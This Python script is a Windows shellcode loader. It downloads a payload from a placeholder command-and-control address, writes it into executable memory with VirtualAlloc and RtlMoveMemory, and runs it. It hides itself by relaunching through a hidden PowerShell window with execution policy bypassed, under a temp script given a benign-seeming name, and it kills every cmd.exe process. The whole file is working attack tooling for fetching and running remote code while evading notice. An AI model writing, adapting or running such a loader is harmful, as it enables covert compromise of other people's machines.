import ctypes
from urllib import request
import os
import sys
import tempfile
import psutil

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Load kernel32 DLL
kernel32 = ctypes.windll.kernel32
shell32 = ctypes.windll.shell32

def get_code(url):
    # Download shellcode from a given URL
    with request.urlopen(url) as response:
        shellcode = response.read()
    return shellcode

def load_shellcode(shellcode):
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]

    # Get the length of the shellcode data  as an integer to be passed to virtualalloc
    buf_size = len(shellcode)
    ptr = kernel32.VirtualAlloc(None, buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    # Write the buffer into allocated memory
    shellcode_buffer = (ctypes.c_char * buf_size).from_buffer_copy(shellcode)
    kernel32.RtlMoveMemory(ptr, shellcode_buffer, buf_size)
    shell_func = ctypes.CFUNCTYPE(None)(ptr)
    shell_func()

def terminate_cmd_processes():
    #Clean up cmd processes
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'cmd.exe':
            try:
                proc.terminate()
                proc.wait(timeout=3)
                print(f'Terminated cmd.exe with PID: {proc.info["pid"]}')
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired) as e:
                print(f'Failed to terminate cmd.exe with PID: {proc.info["pid"]}: {e}')

def run_in_background():
    # Command to run the script in PowerShell
    script_path = os.path.abspath(__file__)
    temp_ps1 = os.path.join(tempfile.gettempdir(), "system_check.ps1")  # Benign-seeming name, perhaps name your loader to match

    # Create the temporary PowerShell script without the environment check and sys.exit()
    with open(temp_ps1, 'w') as ps1_file:
        ps1_file.write(f'& "{sys.executable}" "{script_path}" --background')

    # Use ShellExecute() API to launch PowerShell in the background
    shell32.ShellExecuteW(None, "open", "powershell.exe", f'-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "{temp_ps1}"', None, 0)

if __name__ == '__main__':
    if '--background' not in sys.argv:
        # Set an environment variable to indicate the script is running in the background
        os.environ['RUNNING_IN_BACKGROUND'] = '1'
        # Launch the script in the background and exit the current terminal
        run_in_background()
        # Terminate all cmd.exe processes
        terminate_cmd_processes()
        # Immediately terminate the process to close the terminal window
        os._exit(0)  # Ensure the original terminal closes

    # The script continues here only when running in the background
    url = "http://c2DomainName_or_IP/shellcode.bin"
    shellcode = get_code(url)
    load_shellcode(shellcode)
